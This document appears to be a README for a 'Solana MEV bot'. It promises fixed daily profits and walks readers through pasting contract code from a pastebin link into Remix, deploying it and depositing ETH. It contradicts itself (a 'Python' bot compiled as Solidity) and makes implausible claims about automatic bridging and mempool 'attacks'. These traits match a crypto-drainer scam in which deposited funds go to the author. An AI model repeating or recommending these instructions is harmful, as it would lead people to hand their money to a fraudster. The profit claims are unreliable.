# Solana-Mev-Bot
Optimized Solana MEV (arbitrage) bot in Python for efficient transaction management and maximizing Miner Extractable Value.
Https://Eigenphi.io (Track your bot live after you launch it)


Telegram @JimOpenMev for any questions 
Or Discord @devjim0x


Typical profit is based on liquidity bot has and based on onchain volume that day per 24 hr bot run time. Assuming Sol price is $230. Bridging Eth to Sol and back and gas is also factored in. 

Typical examples of daily profit: (per 24 hr run time) if SOL Price $230 - the higher Sol goes in price the better the profit margins:

0.1 ETH bot liquidity = 0.3 to 0.4 Sol profit/Day

0.2 ETH bot liquidity = 1 + Sol profit/Day

0.4 ETH bot liquidity = 2 +  Sol profit/Day

0.8 ETH bot liquidity = 3 + Sol profit/Day

1 ETH bot liquidity = 4 + Sol profit/Day

2 ETH bot liquidity = 8 + Sol profit/Day


You'll need a PC or Laptop to create and run your bot.


How can I track my profits?

You can now track your mev bot live on Eigenphi.io. After you launch your bot, copy and paste your bot CA into search on eigenphi.io and you’ll see it attacking buys and sells live. 


Be sure to change Solidity Compiler to 0.6.6 as stated below.

STEP BY STEP Instructions :

1. Download MetaMask to your PC or laptop on Google Chrome/Firefox etc extension.

 https://metamask.io/download (Trust wallet works too)

2. Access Remix:
https://remix.ethereum.org
The ONLY URL Remix uses is remix.ethereum.org
Beware of online videos promoting "liquidity front runner bots" using different Remix addresses. 

3.Click on the new file icon and create a new file. Rename it as you like — i.e., ‘Bot.sol’ It has to end in .sol or it won’t compile. Example — Godzillabot.sol Chad.sol Coke.sol etc
If you are having trouble typing in bot.sol refresh page try typing again then press enter.

4. Open and paste the entire bot code in Remix after you open your new file: https://pastebin.com/raw/yLNnRuf6

5. Create a new Sol wallet and paste it’s address on line 37 as shown in video to receive your bot’s SOL profits.

6. Move to the ‘Solidity Compiler’ tab, scroll down select version ‘0.6.6’ and then click ‘Compile. It should show green check mark to confirm code is good and up to date.

7.Move  to the ‘Deploy and run transacions’ tab right below the compile icon. Select  “Wallet Connect" you can also use "Injected Provider" if Wallet Connect is down. 

8. Go down to the orange deploy tab and across from it press down arrow icon as in video tokenName tokenSymbol should appear. Type in BOT in both tokenName and tokenSymbol. Do not press the orange transact tab. Click the arrow again across from deploy and the orange deploy tab will show again.

9.Click ‘Deploy’. You’ll have to pay a little gas here to create bot contract.After the transaction is confirmed, it’s your own bot now. Copy your bot's contract address and check it on etherscan.io

10. Deposit ETH liquidity to your contract/bot address from your metamask. Once again check etherscan afterwards, it will show bot creation and the LP provided.

11. After your transaction is confirmed, start the bot by clicking the red "Action" button. Your ETH will automatically bridge over to SOL and enter and begin attacking Raydium mempool transactions. 

12. When you withdraw by hitting "Action" again — Your SOL liquidity will bridge back to ETH and go to your connected wallet. Your SOL profits will go to the SOL wallet you pasted on line 37. Run your bot however long you wish, I recommend 24 hrs. Just re-fund your liquidity after you withdraw and hit action button again to send it back out. 
